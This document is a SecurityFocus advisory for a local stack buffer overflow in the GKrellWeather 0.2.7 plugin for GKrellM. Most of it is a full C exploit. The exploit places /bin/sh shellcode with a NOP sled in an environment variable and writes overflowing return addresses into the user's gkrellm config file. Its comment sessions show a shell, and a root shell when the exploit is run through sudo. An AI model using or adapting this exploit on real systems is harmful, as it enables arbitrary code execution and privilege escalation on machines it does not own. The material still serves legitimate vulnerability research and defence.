source: http://www.securityfocus.com/bid/27744/info

The GKrellWeather plugin for GKrellM is prone to a local stack-based buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized buffer.

An attacker can exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will result in denial-of-service conditions.

GKrellWeather 0.2.7 is vulnerable; other versions may also be affected. 

/* -------------------------------------------------------|
 * gkrellweather2sh.c 
 * ------------------|
 * Exploit for gkrellm plugin gkrellweather 0.2.7 
 * -> see func read_default()
 *
 * Coded by Manuel Gebele <forensec at yahoo.de>
 *
 * Example sessions:
 * -----------------|
 * $ gcc gkrellweather2sh.c -o gkrellweather2sh
 * 
 *  ---
 * < 1 >
 *  ---
 * $ ./gkrellweather2sh
 * sh-3.1$ whoami
 * mrxy
 * sh-3.1$ exit
 * exit
 * $
 * 
 * For the next session the file /etc/sudoers must contain
 * the following entry:
 * mrxy  ALL=/path/to/gkrellweather2sh
 *
 *  ---
 * < 2 >
 *  ---
 * $ ./gkrellweather2sh
 * sh-3.1# whoami
 * root
 * sh-3.1# exit
 * exit
 * $
 *
 * NOTE: 
 * gkrellm based on GTK+ and setuid/setgid is not a
 * supported use of GTK+.
 * Try xgtk.c for GTK+ up to v1.2.8. Not tested!
 *
 * -------------------------------------------------------|
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
/*							!must be 
adapted! */
#define CONFIG_PATH	"/home/mrxy/.gkrellm2/user-config"
#define ENV_NAME 		"PAYLOAD"

static char payload[] = /* /bin/sh */
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
/* extra N O P's:
 * running exploit in combination with sudo */
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\x31\xc0"					/* xor eax, eax */
"\xb0\x46"					/* mov al, 70 */
"\x31\xdb"					/* xor ebx, ebx */
"\x31\xc9"					/* xor ecx, ecx */
"\xcd\x80"					/* int 0x80 */
"\xeb\x16"					/* jmp short .. */
"\x5b"						/* pop ebx */
"\x31\xc0"					/* xor eax, eax */
"\x88\x43\x07"				/* mov [ebx+7], al */
"\x89\x5b\x08"				/* mov [ebx+8], ebx */
"\x89\x43\x0c"				/* mov [ebx+12], eax */
"\xb0\x0b"					/* mov al, 11 */
"\x8d\x4b\x08"				/* lea ecx, [ebx+8] */
"\x8d\x53\x0c"				/* lea edx, [ebx+12] */
"\xcd\x80"					/* int 0x80 */
"\xe8\xe5\xff\xff\xff"	/* call .. */
/* "\x2f\x62\x69\x6e\x2f\x73\x68" */ 
"/bin/sh"					/* db .. */
;

int main(void)
{
	char lend[9], inject[4], ascii;
	long ret = 0xbffffffa 
				- strlen(payload)
				- strlen("./gkrellweather2sh");
				/*-----------------------------
				 *	environment variable address 
				 */
	int i, j, ucd = open(CONFIG_PATH, O_WRONLY | O_APPEND);
	
	if (ucd == -1)
		return EXIT_FAILURE;

	if (setenv(ENV_NAME, payload, 1) != 0)
		return EXIT_FAILURE;

	snprintf(lend, 9, "%lx", ret);

	i = 7; j = 0;
	while (j < 4) {
		ascii = (lend[i-1] >= 'a' 
			? ((lend[i-1] & 0xdf) - 'A') + 10
			: (lend[i-1] - '0'));
		ascii <<= 4;
		ascii += (lend[i] >= 'a' 
			? ((lend[i] & 0xdf) - 'A') + 10
			: (lend[i] - '0'));
		inject[j++] = ascii;
		i -= 2;
	}
	
	write(ucd, "gkrellweather filename ", 23);
	for (i = 0; i < 200; ++i)
		write(ucd, inject, 4);
	close(ucd);
	
	system("gkrellm");
	
	return EXIT_SUCCESS;
}
/* vim :set ts=3 (Vi IMproved <www.vim.org>) */